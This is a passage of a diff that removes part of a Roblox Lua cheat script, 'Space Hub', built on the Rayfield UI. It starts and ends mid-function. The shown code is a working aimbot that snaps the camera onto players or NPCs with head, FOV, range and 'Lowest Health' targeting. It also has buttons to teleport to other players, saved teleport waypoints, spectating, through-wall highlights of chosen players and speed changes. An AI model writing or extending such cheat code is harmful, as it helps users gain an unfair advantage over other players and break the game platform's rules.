-    end
-
-    if not camera
-        or not targetPart
-        or not character then
-
-        return false
-    end
-
-    local origin =
-        camera.CFrame.Position
-
-    local direction =
-        targetPart.Position - origin
-
-    local params =
-        RaycastParams.new()
-
-    params.FilterType =
-        Enum.RaycastFilterType.Exclude
-
-    params.FilterDescendantsInstances = {
-        Character,
-        camera
-    }
-
-    local result =
-        workspace:Raycast(
-            origin,
-            direction,
-            params
-        )
-
-    if not result then
-        return true
-    end
-
-    return result.Instance:IsDescendantOf(
-        character
-    )
-end
-
-
---//======================================================
---// ENTITY CACHE
---//======================================================
-
-local function registerEntity(model)
-
-    if not model
-        or not model:IsA("Model")
-        or not model.Parent then
-
-        return
-    end
-
-    -- Never register Player characters.
-    if Players:GetPlayerFromCharacter(model) then
-
-        entityCache[model] = nil
-
-        return
-    end
-
-    local humanoid =
-        model:FindFirstChildOfClass(
-            "Humanoid"
-        )
-
-    local root =
-        model:FindFirstChild(
-            "HumanoidRootPart"
-        )
-
-    if humanoid
-        and root
-        and root:IsA("BasePart")
-        and humanoid.Health > 0 then
-
-        entityCache[model] = true
-
-    else
-
-        entityCache[model] = nil
-
-    end
-end
-
-
-local function unregisterEntity(model)
-
-    entityCache[model] = nil
-
-end
-
-
---//======================================================
---// INITIAL ENTITY SCAN
---//======================================================
-
-local function initializeEntityCache()
-
-    if entityCacheInitialized then
-        return
-    end
-
-    entityCacheInitialized = true
-
-    -- This full scan happens ONLY ONCE,
-    -- when entity mode is first activated.
-
-    for _, descendant in ipairs(
-        workspace:GetDescendants()
-    ) do
-
-        if descendant:IsA("Model") then
-
-            registerEntity(
-                descendant
-            )
-
-        end
-    end
-end
-
-
---//======================================================
---// DETECT NEW / REMOVED ENTITIES
---//======================================================
-
-workspace.DescendantAdded:Connect(
-    function(instance)
-
-        if instance:IsA("Model") then
-
-            task.defer(function()
-
-                registerEntity(
-                    instance
-                )
-
-            end)
-
-            return
-        end
-
-        if instance.Name == "Humanoid"
-            or instance.Name == "HumanoidRootPart" then
-
-            local model =
-                instance:FindFirstAncestorOfClass(
-                    "Model"
-                )
-
-            if model then
-
-                task.defer(function()
-
-                    registerEntity(
-                        model
-                    )
-
-                end)
-
-            end
-        end
-    end
-)
-
-
-workspace.DescendantRemoving:Connect(
-    function(instance)
-
-        if instance:IsA("Model") then
-
-            unregisterEntity(
-                instance
-            )
-
-            return
-        end
-
-        if instance.Name == "Humanoid"
-            or instance.Name == "HumanoidRootPart" then
-
-            local model =
-                instance:FindFirstAncestorOfClass(
-                    "Model"
-                )
-
-            if model then
-
-                unregisterEntity(
-                    model
-                )
-
-            end
-        end
-    end
-)
-
-
---//======================================================
---// GET ENTITY LIST
---//======================================================
-
-local function getEntityModels()
-
-    initializeEntityCache()
-
-    local entities = {}
-
-    for model in pairs(entityCache) do
-
-        if model
-            and model.Parent then
-
-            local humanoid =
-                model:FindFirstChildOfClass(
-                    "Humanoid"
-                )
-
-            local root =
-                model:FindFirstChild(
-                    "HumanoidRootPart"
-                )
-
-            -- Make sure it is still a valid entity.
-            if humanoid
-                and root
-                and root:IsA("BasePart")
-                and humanoid.Health > 0
-                and not Players:GetPlayerFromCharacter(
-                    model
-                ) then
-
-                entities[#entities + 1] =
-                    model
-
-            else
-
-                entityCache[model] =
-                    nil
-
-            end
-
-        else
-
-            entityCache[model] =
-                nil
-
-        end
-    end
-
-    return entities
-end
-
-
---//======================================================
---// PLAYER TARGET SCORE
---//======================================================
-
-local function getPlayerTargetScore(
-    player,
-    camera
-)
-
-    if not HRP then
-        return nil
-    end
-
-    if player == LocalPlayer then
-        return nil
-    end
-
-    -- Team check
-    if teamCheck
-        and player.Team == LocalPlayer.Team then
-
-        return nil
-    end
-
-    local character =
-        player.Character
-
-    if not character then
-        return nil
-    end
-
-    local humanoid =
-        character:FindFirstChildOfClass(
-            "Humanoid"
-        )
-
-    local root =
-        character:FindFirstChild(
-            "HumanoidRootPart"
-        )
-
-    local part =
-        getTargetPart(
-            character
-        )
-
-    if not humanoid
-        or humanoid.Health <= 0
-        or not root
-        or not part then
-
-        return nil
-    end
-
-    -- World distance
-    local worldDistance =
-        (
-            HRP.Position
-            - root.Position
-        ).Magnitude
-
-    if worldDistance >
-        aimbotMaxDistance then
-
-        return nil
-    end
-
-    -- Screen position
-    local screenPosition,
-        onScreen =
-        camera:WorldToViewportPoint(
-            part.Position
-        )
-
-    if not onScreen then
-        return nil
-    end
-
-    -- Visibility
-    if not isVisible(
-        camera,
-        part,
-        character
-    ) then
-
-        return nil
-    end
-
-    -- FOV
-    local center =
-        camera.ViewportSize / 2
-
-    local screenDistance =
-        (
-            Vector2.new(
-                screenPosition.X,
-                screenPosition.Y
-            )
-            - center
-        ).Magnitude
-
-    if aimbotFOVEnabled
-        and screenDistance > aimbotFOV then
-
-        return nil
-    end
-
-    -- Priority
-    if aimbotPriority == "Closest" then
-
-        return worldDistance
-
-    elseif aimbotPriority == "Lowest Health" then
-
-        return humanoid.Health
-
-    else
-
-        return screenDistance
-
-    end
-end
-
-
---//======================================================
---// ENTITY TARGET SCORE
---//======================================================
-
-local function getEntityTargetScore(
-    entity,
-    camera
-)
-
-    if not HRP then
-        return nil
-    end
-
-    if not entity
-        or not entity.Parent then
-
-        return nil
-    end
-
-    -- Entity MUST NOT be a Player.
-    if Players:GetPlayerFromCharacter(
-        entity
-    ) then
-
-        return nil
-    end
-
-    local humanoid =
-        entity:FindFirstChildOfClass(
-            "Humanoid"
-        )
-
-    local root =
-        entity:FindFirstChild(
-            "HumanoidRootPart"
-        )
-
-    local part =
-        getTargetPart(
-            entity
-        )
-
-    -- Required entity structure.
-    if not humanoid
-        or humanoid.Health <= 0
-        or not root
-        or not root:IsA("BasePart")
-        or not part then
-
-        return nil
-    end
-
-    -- Distance
-    local worldDistance =
-        (
-            HRP.Position
-            - root.Position
-        ).Magnitude
-
-    if worldDistance >
-        aimbotMaxDistance then
-
-        return nil
-    end
-
-    -- Screen position
-    local screenPosition,
-        onScreen =
-        camera:WorldToViewportPoint(
-            part.Position
-        )
-
-    if not onScreen then
-        return nil
-    end
-
-    -- Visibility
-    if not isVisible(
-        camera,
-        part,
-        entity
-    ) then
-
-        return nil
-    end
-
-    -- FOV
-    local center =
-        camera.ViewportSize / 2
-
-    local screenDistance =
-        (
-            Vector2.new(
-                screenPosition.X,
-                screenPosition.Y
-            )
-            - center
-        ).Magnitude
-
-    if aimbotFOVEnabled
-        and screenDistance > aimbotFOV then
-
-        return nil
-    end
-
-    -- Priority
-    if aimbotPriority == "Closest" then
-
-        return worldDistance
-
-    elseif aimbotPriority == "Lowest Health" then
-
-        return humanoid.Health
-
-    else
-
-        return screenDistance
-
-    end
-end
-
-
---//======================================================
---// FIND BEST TARGET
---//======================================================
-
-local function getBestTarget(
-    camera
-)
-
-    local bestTarget = nil
-    local bestScore = math.huge
-
-
-    --====================================================
-    -- ONLY PLAYERS
-    --====================================================
-
-    if aimbotOnlyPlayers then
-
-        for _, player in ipairs(
-            Players:GetPlayers()
-        ) do
-
-            local score =
-                getPlayerTargetScore(
-                    player,
-                    camera
-                )
-
-            if score
-                and score < bestScore then
-
-                bestScore =
-                    score
-
-                bestTarget = {
-                    Type = "Player",
-                    Object = player,
-                    Character =
-                        player.Character
-                }
-            end
-        end
-    end
-
-
-    --====================================================
-    -- ONLY ENTITIES
-    --====================================================
-
-    if aimbotOnlyEntities then
-
-        for _, entity in ipairs(
-            getEntityModels()
-        ) do
-
-            local score =
-                getEntityTargetScore(
-                    entity,
-                    camera
-                )
-
-            if score
-                and score < bestScore then
-
-                bestScore =
-                    score
-
-                bestTarget = {
-                    Type = "Entity",
-                    Object = entity,
-                    Character = entity
-                }
-            end
-        end
-    end
-
-    return bestTarget
-end
-
-
---//======================================================
---// STOP AIMBOT
---//======================================================
-
-local function stopAimbot()
-
-    if aimbotConnection then
-
-        aimbotConnection:Disconnect()
-
-        aimbotConnection =
-            nil
-    end
-
-    currentAimbotTarget =
-        nil
-
-    nextTargetSearch =
-        0
-end
-
-
---//======================================================
---// START AIMBOT
---//======================================================
-
-local function startAimbot()
-
-    stopAimbot()
-
-    aimbotConnection =
-        RunService.RenderStepped:Connect(
-            function()
-
-                if not aimbotEnabled then
-                    return
-                end
-
-
-                --================================================
-                -- NO TARGET MODE
-                --================================================
-
-                if not aimbotOnlyPlayers
-                    and not aimbotOnlyEntities then
-
-                    currentAimbotTarget =
-                        nil
-
-                    return
-                end
-
-
-                local camera =
-                    workspace.CurrentCamera
-
-                if not camera
-                    or not HRP then
-
-                    return
-                end
-
-
-                --================================================
-                -- TARGET SEARCH THROTTLE
-                --================================================
-                --
-                -- The expensive search only happens every
-                -- 0.10 seconds instead of every frame.
-                --
-                -- Camera movement still happens every frame.
-                --
-
-                local now =
-                    os.clock()
-
-                if now >= nextTargetSearch then
-
-                    currentAimbotTarget =
-                        getBestTarget(
-                            camera
-                        )
-
-                    nextTargetSearch =
-                        now
-                        + AIMBOT_TARGET_REFRESH
-                end
-
-
-                --================================================
-                -- CURRENT TARGET
-                --================================================
-
-                local target =
-                    currentAimbotTarget
-
-                if not target
-                    or not target.Character then
-
-                    currentAimbotTarget =
-                        nil
-
-                    return
-                end
-
-
-                --================================================
-                -- TARGET PART
-                --================================================
-
-                local part =
-                    getTargetPart(
-                        target.Character
-                    )
-
-                if not part then
-
-                    currentAimbotTarget =
-                        nil
-
-                    return
-                end
-
-
-                --================================================
-                -- CAMERA SMOOTHING
-                --================================================
-
-                local targetCFrame =
-                    CFrame.lookAt(
-                        camera.CFrame.Position,
-                        part.Position
-                    )
-
-                camera.CFrame =
-                    camera.CFrame:Lerp(
-                        targetCFrame,
-                        aimbotSmoothness
-                    )
-            end
-        )
-end
-
-
---//======================================================
---// AIMBOT MAIN TOGGLE
---//======================================================
-
-GameTab:CreateToggle({
-    Name = "Aimbot",
-
-    CurrentValue = false,
-
-    Flag = "Aimbot",
-
-    Callback = function(enabled)
-
-        aimbotEnabled =
-            enabled
-
-        if enabled then
-
-            startAimbot()
-
-            Rayfield:Notify({
-                Title = "TARGETING",
-                Content =
-                    "Advanced targeting system online.",
-                Duration = 3,
-                Image = "crosshair"
-            })
-
-        else
-
-            stopAimbot()
-
-        end
-    end
-})
-
-
---//======================================================
---// ONLY PLAYERS
---//======================================================
-
-GameTab:CreateToggle({
-    Name = "Only Players",
-
-    CurrentValue = true,
-
-    Flag = "AimbotOnlyPlayers",
-
-    Callback = function(enabled)
-
-        aimbotOnlyPlayers =
-            enabled
-
-        currentAimbotTarget =
-            nil
-
-        nextTargetSearch =
-            0
-
-        -- Only one mode can be active.
-        if enabled then
-
-            aimbotOnlyEntities =
-                false
-
-            pcall(function()
-
-                Rayfield.Flags[
-                    "AimbotOnlyEntities"
-                ]:Set(false)
-
-            end)
-        end
-    end
-})
-
-
---//======================================================
---// ONLY ENTITIES
---//======================================================
-
-GameTab:CreateToggle({
-    Name = "Only Entities",
-
-    CurrentValue = false,
-
-    Flag = "AimbotOnlyEntities",
-
-    Callback = function(enabled)
-
-        aimbotOnlyEntities =
-            enabled
-
-        currentAimbotTarget =
-            nil
-
-        nextTargetSearch =
-            0
-
-        if enabled then
-
-            -- Only initialize the entity cache
-            -- when the user actually needs it.
-            initializeEntityCache()
-
-            aimbotOnlyPlayers =
-                false
-
-            pcall(function()
-
-                Rayfield.Flags[
-                    "AimbotOnlyPlayers"
-                ]:Set(false)
-
-            end)
-        end
-    end
-})
-
-
---//======================================================
---// TARGET MODE INFO
---//======================================================
-
-GameTab:CreateParagraph({
-
-    Title = "TARGET MODES",
-
-    Content =
-        "ONLY PLAYERS  →  Roblox Players\n" ..
-        "ONLY ENTITIES  →  NPCs / entities with Humanoid + HumanoidRootPart\n\n" ..
-        "Entities are cached instead of scanning the entire Workspace every frame."
-})
-
-
---//======================================================
---// TARGET PART
---//======================================================
-
-GameTab:CreateDropdown({
-
-    Name = "Target Part",
-
-    Options = {
-        "Head",
-        "Torso",
-        "Root"
-    },
-
-    CurrentOption = {
-        "Head"
-    },
-
-    MultipleOptions = false,
-
-    Flag = "AimbotPart",
-
-    Callback = function(option)
-
-        aimbotPart =
-            typeof(option) == "table"
-            and option[1]
-            or option
-
-        currentAimbotTarget =
-            nil
-    end
-})
-
-
---//======================================================
---// TARGET PRIORITY
---//======================================================
-
-GameTab:CreateDropdown({
-
-    Name = "Target Priority",
-
-    Options = {
-        "FOV",
-        "Closest",
-        "Lowest Health"
-    },
-
-    CurrentOption = {
-        "FOV"
-    },
-
-    MultipleOptions = false,
-
-    Flag = "AimbotPriority",
-
-    Callback = function(option)
-
-        aimbotPriority =
-            typeof(option) == "table"
-            and option[1]
-            or option
-
-        currentAimbotTarget =
-            nil
-    end
-})
-
-
---//======================================================
---// FOV LIMITER
---//======================================================
-
-GameTab:CreateToggle({
-
-    Name = "FOV Limiter",
-
-    CurrentValue = true,
-
-    Flag = "AimbotFOVEnabled",
-
-    Callback = function(enabled)
-
-        aimbotFOVEnabled =
-            enabled
-
-        currentAimbotTarget =
-            nil
-
-        nextTargetSearch =
-            0
-    end
-})
-
-
---//======================================================
---// FOV
---//======================================================
-
-GameTab:CreateSlider({
-
-    Name = "Aimbot FOV",
-
-    Range = {
-        50,
-        1000
-    },
-
-    Increment = 10,
-
-    Suffix = " PX",
-
-    CurrentValue = 250,
-
-    Flag = "AimbotFOV",
-
-    Callback = function(value)
-
-        aimbotFOV =
-            value
-
-        currentAimbotTarget =
-            nil
-
-        nextTargetSearch =
-            0
-    end
-})
-
-
---//======================================================
---// MAX DISTANCE
---//======================================================
-
-GameTab:CreateSlider({
-
-    Name = "Maximum Distance",
-
-    Range = {
-        50,
-        5000
-    },
-
-    Increment = 50,
-
-    Suffix = " studs",
-
-    CurrentValue = 500,
-
-    Flag = "AimbotMaxDistance",
-
-    Callback = function(value)
-
-        aimbotMaxDistance =
-            value
-
-        currentAimbotTarget =
-            nil
-
-        nextTargetSearch =
-            0
-    end
-})
-
-
---//======================================================
---// SMOOTHNESS
---//======================================================
-
-GameTab:CreateSlider({
-
-    Name = "Smoothness",
-
-    Range = {
-        0.05,
-        1
-    },
-
-    Increment = 0.05,
-
-    Suffix = "",
-
-    CurrentValue = 0.18,
-
-    Flag = "AimbotSmoothness",
-
-    Callback = function(value)
-
-        aimbotSmoothness =
-            value
-    end
-})
-
-
---//======================================================
---// TEAM CHECK
---//======================================================
-
-GameTab:CreateToggle({
-
-    Name = "Team Check",
-
-    CurrentValue = false,
-
-    Flag = "TeamCheck",
-
-    Callback = function(enabled)
-
-        teamCheck =
-            enabled
-
-        currentAimbotTarget =
-            nil
-
-        nextTargetSearch =
-            0
-    end
-})
-
-
---//======================================================
---// VISIBLE CHECK
---//======================================================
-
-GameTab:CreateToggle({
-
-    Name = "Visible Check",
-
-    CurrentValue = false,
-
-    Flag = "AimbotVisibleCheck",
-
-    Callback = function(enabled)
-
-        aimbotVisibleCheck =
-            enabled
-
-        currentAimbotTarget =
-            nil
-
-        nextTargetSearch =
-            0
-    end
-})
-
-
---//======================================================
---// TARGET STATUS
---//======================================================
-
-GameTab:CreateParagraph({
-
-    Title = "TARGET STATUS",
-
-    Content =
-        "Mode  →  "
-        .. (
-            aimbotOnlyPlayers
-            and "ONLY PLAYERS"
-            or (
-                aimbotOnlyEntities
-                and "ONLY ENTITIES"
-                or "NONE"
-            )
-        )
-        .. "\n"
-        .. "Part  →  "
-        .. tostring(
-            aimbotPart
-        )
-        .. "\n"
-        .. "Priority  →  "
-        .. tostring(
-            aimbotPriority
-        )
-        .. "\n"
-        .. "Range  →  "
-        .. tostring(
-            aimbotMaxDistance
-        )
-        .. " studs\n"
-        .. "FOV  →  "
-        .. tostring(
-            aimbotFOV
-        )
-        .. " px"
-})
-
---//======================================================
---// TELEPORT
---//======================================================
-
-TeleportTab:CreateParagraph({
-
-    Title = "✦ ORBITAL TELEPORT  /  TRANSPORT",
-
-    Content =
-        "Player and world transportation systems."
-
-})
-
---//======================================================
---// PLAYER DESTINATIONS
---//======================================================
-
-TeleportTab:CreateSection(
-    "TELEPORT  /  PLAYERS"
-)
-
-local function teleportToPlayer(player)
-
-    if not HRP then
-        return
-    end
-
-    local character =
-        player.Character
-
-    if not character then
-        return
-    end
-
-    local targetHRP =
-        character:FindFirstChild(
-            "HumanoidRootPart"
-        )
-
-    if not targetHRP then
-        return
-    end
-
-    HRP.CFrame =
-        targetHRP.CFrame
-        * CFrame.new(
-            3,
-            0,
-            0
-        )
-
-    Rayfield:Notify({
-
-        Title = "TELEPORT",
-
-        Content =
-            "Arrived near "
-            .. player.DisplayName,
-
-        Duration = 2,
-
-        Image = "sparkles"
-
-    })
-
-end
-
-local function createTeleportButton(player)
-
-    if player == LocalPlayer then
-        return
-    end
-
-    TeleportTab:CreateButton({
-
-        Name =
-            "TP  •  "
-            .. player.Name,
-
-        Callback = function()
-
-            teleportToPlayer(
-                player
-            )
-
-        end
-
-    })
-
-end
-
-for _, player in ipairs(
-    Players:GetPlayers()
-) do
-
-    createTeleportButton(player)
-
-end
-
-Players.PlayerAdded:Connect(
-    function(player)
-
-        task.wait(0.5)
-
-        createTeleportButton(player)
-
-    end
-)
-
---//======================================================
---// SYSTEM DESTINATIONS
---//======================================================
-
-TeleportTab:CreateSection(
-    "TELEPORT  /  SYSTEM"
-)
-
-TeleportTab:CreateButton({
-
-    Name = "Teleport To Spawn",
-
-    Callback = function()
-
-        if not HRP then
-            return
-        end
-
-        local spawn =
-            workspace:FindFirstChild(
-                "SpawnLocation",
-                true
-            )
-
-        if spawn
-            and spawn:IsA("BasePart") then
-
-            HRP.CFrame =
-                spawn.CFrame
-                * CFrame.new(
-                    0,
-                    5,
-                    0
-                )
-
-        else
-
-            Rayfield:Notify({
-
-                Title = "TELEPORT",
-
-                Content =
-                    "No SpawnLocation found.",
-
-                Duration = 3,
-
-                Image = "sparkles"
-
-            })
-
-        end
-
-    end
-
-})
-
---//======================================================
---// WAYPOINTS
---//======================================================
-
-WaypointsTab:CreateParagraph({
-    Title = "✦ WAYPOINT NETWORK  /  POSITION MANAGER",
-    Content =
-        "Save locations, return to previous positions and manage your personal navigation points."
-})
-
-local waypointFile = "SpaceHub_Waypoints.json"
-
-local function saveWaypointsToDisk()
-    if not (writefile and readfile and isfile) then return false end
-    local ok = pcall(function()
-        writefile(waypointFile, HttpService:JSONEncode(waypoints))
-    end)
-    return ok
-end
-
-local function loadWaypointsFromDisk()
-    if not (writefile and readfile and isfile) then return end
-    if not isfile(waypointFile) then return end
-
-    pcall(function()
-        local decoded = HttpService:JSONDecode(readfile(waypointFile))
-        if typeof(decoded) == "table" then
-            waypoints = decoded
-        end
-    end)
-end
-
-local function waypointNames()
-    local names = {}
-    for name in pairs(waypoints) do
-        table.insert(names, name)
-    end
-    table.sort(names)
-    if #names == 0 then
-        names = {"No waypoints"}
-    end
-    return names
-end
-
-local WaypointDropdown = WaypointsTab:CreateDropdown({
-    Name = "Selected Waypoint",
-    Options = waypointNames(),
-    CurrentOption = {waypointNames()[1]},
-    MultipleOptions = false,
-    Flag = "SelectedWaypoint",
-    Callback = function(option)
-        selectedWaypoint = typeof(option) == "table" and option[1] or option
-        if selectedWaypoint == "No waypoints" then
-            selectedWaypoint = nil
-        end
-    end
-})
-
-local function refreshWaypointDropdown()
-    local names = waypointNames()
-    pcall(function()
-        WaypointDropdown:Refresh(names, true)
-    end)
-    if selectedWaypoint and waypoints[selectedWaypoint] then
-        pcall(function()
-            WaypointDropdown:Set({selectedWaypoint})
-        end)
-    end
-end
-
-local function saveWaypoint(name)
-    if not HRP then
-        Rayfield:Notify({
-            Title = "WAYPOINTS",
-            Content = "Character is not ready.",
-            Duration = 3,
-            Image = "circle-alert"
-        })
-        return
-    end
-
-    local pos = HRP.Position
-    local look = HRP.CFrame.LookVector
-
-    waypoints[name] = {
-        x = pos.X,
-        y = pos.Y,
-        z = pos.Z,
-        lx = look.X,
-        ly = look.Y,
-        lz = look.Z
-    }
-
-    selectedWaypoint = name
-    saveWaypointsToDisk()
-    refreshWaypointDropdown()
-
-    Rayfield:Notify({
-        Title = "WAYPOINT SAVED",
-        Content = name,
-        Duration = 3,
-        Image = "bookmark"
-    })
-end
-
-local function teleportToWaypoint(name)
-    if not HRP or not name or not waypoints[name] then return end
-
-    local data = waypoints[name]
-    previousPosition = HRP.CFrame
-
-    HRP.CFrame = CFrame.lookAt(
-        Vector3.new(data.x, data.y, data.z),
-        Vector3.new(data.x + data.lx, data.y + data.ly, data.z + data.lz)
-    )
-
-    Rayfield:Notify({
-        Title = "WAYPOINT",
-        Content = "Arrived at  •  " .. name,
-        Duration = 2,
-        Image = "navigation"
-    })
-end
-
-WaypointsTab:CreateInput({
-    Name = "Waypoint Name",
-    PlaceholderText = "Example: Base",
-    RemoveTextAfterFocusLost = false,
-    Callback = function(value)
-        if value and value ~= "" then
-            saveWaypoint(value)
-        end
-    end
-})
-
-WaypointsTab:CreateButton({
-    Name = "Save Current Position",
-    Callback = function()
-        local name = "Waypoint " .. tostring(#waypointNames() + 1)
-        saveWaypoint(name)
-    end
-})
-
-WaypointsTab:CreateButton({
-    Name = "Teleport To Selected",
-    Callback = function()
-        teleportToWaypoint(selectedWaypoint)
-    end
-})
-
-WaypointsTab:CreateButton({
-    Name = "Return To Previous Position",
-    Callback = function()
-        if HRP and previousPosition then
-            local current = HRP.CFrame
-            HRP.CFrame = previousPosition
-            previousPosition = current
-        else
-            Rayfield:Notify({
-                Title = "WAYPOINTS",
-                Content = "No previous position is available.",
-                Duration = 3,
-                Image = "circle-alert"
-            })
-        end
-    end
-})
-
-WaypointsTab:CreateButton({
-    Name = "Delete Selected Waypoint",
-    Callback = function()
-        if selectedWaypoint and waypoints[selectedWaypoint] then
-            local deleted = selectedWaypoint
-            waypoints[selectedWaypoint] = nil
-            selectedWaypoint = nil
-            saveWaypointsToDisk()
-            refreshWaypointDropdown()
-
-            Rayfield:Notify({
-                Title = "WAYPOINT DELETED",
-                Content = deleted,
-                Duration = 2,
-                Image = "trash-2"
-            })
-        end
-    end
-})
-
-WaypointsTab:CreateButton({
-    Name = "Clear All Waypoints",
-    Callback = function()
-        waypoints = {}
-        selectedWaypoint = nil
-        saveWaypointsToDisk()
-        refreshWaypointDropdown()
-
-        Rayfield:Notify({
-            Title = "WAYPOINTS",
-            Content = "All saved waypoints cleared.",
-            Duration = 3,
-            Image = "trash-2"
-        })
-    end
-})
-
-WaypointsTab:CreateButton({
-    Name = "Quickpoint  •  Save Current",
-    Callback = function()
-        saveWaypoint("Quickpoint")
-    end
-})
-
-loadWaypointsFromDisk()
-refreshWaypointDropdown()
-
---//======================================================
---// PLAYER MANAGER
---//======================================================
-
-PlayerManagerTab:CreateParagraph({
-    Title = "✦ PLAYER MANAGER  /  OPERATOR CONSOLE",
-    Content =
-        "Select a player to inspect their live information, teleport to them or spectate their character."
-})
-
-local function playerNames()
-    local names = {}
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            table.insert(names, player.Name)
-        end
-    end
-    table.sort(names)
-    if #names == 0 then names = {"No players"} end
-    return names
-end
-
-local PlayerDropdown = PlayerManagerTab:CreateDropdown({
-    Name = "Select Player",
-    Options = playerNames(),
-    CurrentOption = {playerNames()[1]},
-    MultipleOptions = false,
-    Flag = "SelectedPlayer",
-    Callback = function(option)
-        local name = typeof(option) == "table" and option[1] or option
-        selectedPlayer = Players:FindFirstChild(name)
-        if name == "No players" then selectedPlayer = nil end
-    end
-})
-
-local function refreshPlayerDropdown()
-    local names = playerNames()
-    pcall(function()
-        PlayerDropdown:Refresh(names, true)
-    end)
-end
-
-PlayerManagerTab:CreateSection("PLAYER INFORMATION")
-
-local PMNameLabel = PlayerManagerTab:CreateLabel("Player  •  None", "user")
-local PMHealthLabel = PlayerManagerTab:CreateLabel("Health  •  --", "heart")
-local PMDistanceLabel = PlayerManagerTab:CreateLabel("Distance  •  --", "ruler")
-local PMTeamLabel = PlayerManagerTab:CreateLabel("Team  •  --", "shield")
-
-PlayerManagerTab:CreateSection("ACTIONS")
-
-local function teleportToSelected()
-    if selectedPlayer then
-        teleportToPlayer(selectedPlayer)
-    end
-end
-
-PlayerManagerTab:CreateButton({
-    Name = "Teleport To Selected",
-    Callback = teleportToSelected
-})
-
-PlayerManagerTab:CreateButton({
-    Name = "Spectate Selected",
-    Callback = function()
-        if selectedPlayer and selectedPlayer.Character then
-            local hum = selectedPlayer.Character:FindFirstChildOfClass("Humanoid")
-            if hum and workspace.CurrentCamera then
-                workspace.CurrentCamera.CameraSubject = hum
-                spectating = true
-                Rayfield:Notify({
-                    Title = "PLAYER MANAGER",
-                    Content = "Spectating  •  " .. selectedPlayer.DisplayName,
-                    Duration = 2,
-                    Image = "eye"
-                })
-            end
-        end
-    end
-})
-
-PlayerManagerTab:CreateButton({
-    Name = "Stop Spectating",
-    Callback = function()
-        if Humanoid and workspace.CurrentCamera then
-            workspace.CurrentCamera.CameraSubject = Humanoid
-        end
-        spectating = false
-    end
-})
-
-PlayerManagerTab:CreateButton({
-    Name = "Highlight Selected",
-    Callback = function()
-        if not selectedPlayer or not selectedPlayer.Character then return end
-
-        local existing = selectedPlayer.Character:FindFirstChild("SpaceHub_Selected")
-        if existing then
-            existing:Destroy()
-            return
-        end
-
-        local highlight = Instance.new("Highlight")
-        highlight.Name = "SpaceHub_Selected"
-        highlight.FillTransparency = 0.65
-        highlight.OutlineTransparency = 0
-        highlight.FillColor = Color3.fromRGB(255, 210, 80)
-        highlight.OutlineColor = Color3.fromRGB(255, 245, 180)
-        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-        highlight.Parent = selectedPlayer.Character
-    end
-})
-
-task.spawn(function()
-    while task.wait(0.25) do
-        if selectedPlayer and selectedPlayer.Parent then
-            local character = selectedPlayer.Character
-            local hum = character and character:FindFirstChildOfClass("Humanoid")
-            local root = character and character:FindFirstChild("HumanoidRootPart")
-
-            PMNameLabel:Set(
-                "Player  •  " .. selectedPlayer.DisplayName .. "  @" .. selectedPlayer.Name,
-                "user"
-            )
-
-            PMHealthLabel:Set(
-                "Health  •  " ..
-                (hum and (math.floor(hum.Health + 0.5) .. " / " .. math.floor(hum.MaxHealth + 0.5)) or "--"),
-                "heart"
-            )
-
-            local distance = HRP and root and (HRP.Position - root.Position).Magnitude
-            PMDistanceLabel:Set(
-                "Distance  •  " .. (distance and (math.floor(distance) .. " studs") or "--"),
-                "ruler"
-            )
-
-            PMTeamLabel:Set(
-                "Team  •  " .. (selectedPlayer.Team and selectedPlayer.Team.Name or "Neutral"),
-                "shield"
-            )
-        else
-            PMNameLabel:Set("Player  •  None", "user")
-            PMHealthLabel:Set("Health  •  --", "heart")
-            PMDistanceLabel:Set("Distance  •  --", "ruler")
-            PMTeamLabel:Set("Team  •  --", "shield")
-        end
-    end
-end)
-
-Players.PlayerAdded:Connect(function()
-    task.wait(0.5)
-    refreshPlayerDropdown()
-end)
-
-Players.PlayerRemoving:Connect(function(player)
-    if selectedPlayer == player then
-        selectedPlayer = nil
-    end
-    refreshPlayerDropdown()
-end)
-
---//======================================================
---// CONFIGURATION
---//======================================================
-
-ConfigurationTab:CreateParagraph({
-
-    Title = "✦ SYSTEM CONFIGURATION  /  PREFERENCES",
-
-    Content =
-        "Tune movement, interface and targeting preferences."
-
-})
-
-ConfigurationTab:CreateSection(
-    "PARAMETERS  /  MOVEMENT"
-)
-
-ConfigurationTab:CreateSlider({
-
-    Name = "Default WalkSpeed",
-
-    Range = {
-        1,
-        250
-    },
-
-    Increment = 1,
-
-    Suffix = " SPD",
-
-    CurrentValue = 16,
-
-    Flag = "ConfigWalkSpeed",
-
-    Callback = function(value)
-
-        walkSpeed =
-            value
-
-        if Humanoid then
-            Humanoid.WalkSpeed =
-                value
-        end
-
-    end
-
-})
-
-ConfigurationTab:CreateSlider({
-
-    Name = "Default FlightSpeed",
-
-    Range = {
-        10,
-        300
-    },
-
-    Increment = 5,
-
-    Suffix = " SPD",
-
-    CurrentValue = 50,
-
-    Flag = "ConfigFlightSpeed",
-
-    Callback = function(value)
-
-        flightSpeed =
-            value
-
-    end
-
-})
-
---//======================================================
---// THEMES
---//======================================================
-
-ConfigurationTab:CreateSection(
-    "INTERFACE  /  CORE"
-)
-
-ConfigurationTab:CreateDropdown({
-
-    Name = "Interface Theme",
-
-    Options = {
-
-        "Default",
-        "DarkBlue",
-        "Ocean",
-        "Amethyst",
-        "Bloom",
-        "Serenity",
-        "Green",
-        "AmberGlow",
-        "Light",
-        "Orbital"
-
-    },
-
-    CurrentOption = {
-        "Orbital"
-    },
-
-    MultipleOptions = false,
-
-    Flag = "Theme",
-
-    Callback = function(option)
-
-        local theme
-
-        if typeof(option) == "table" then
-            theme = option[1]
-        else
-            theme = option
-        end
-
-        if theme then
-
-            pcall(function()
-
-                if theme == "Orbital" then
-                    Window:ModifyTheme(SpaceTheme)
-                else
-                    Window:ModifyTheme(theme)
-                end
-
-            end)
-
-        end
-
-    end
-
-})
-
-ConfigurationTab:CreateParagraph({
-
-    Title = "SPACE HUB  •  3.0.0  /  ORBITAL EDITION",
-
-    Content =
-        "Premium Orbital Interface\n\n" ..
-        "Movement Core\n" ..
-        "Targeting Core\n" ..
-        "Visual Systems\n" ..
-        "Teleport Network\n" ..
-        "Mass Transport\n" ..
-        "Configuration Core"
-
-})
-
---//======================================================
---// CHARACTER RESPAWN
---//======================================================
-
-LocalPlayer.CharacterAdded:Connect(
-    function(character)
-
-        task.wait(0.5)
-
-        updateCharacter(
-            character
-        )
-
-        if Humanoid then
-            Humanoid.WalkSpeed = walkSpeed
-            Humanoid.UseJumpPower = true
-            Humanoid.JumpPower = jumpPower
-            Humanoid.HipHeight = hipHeight
-        end
-
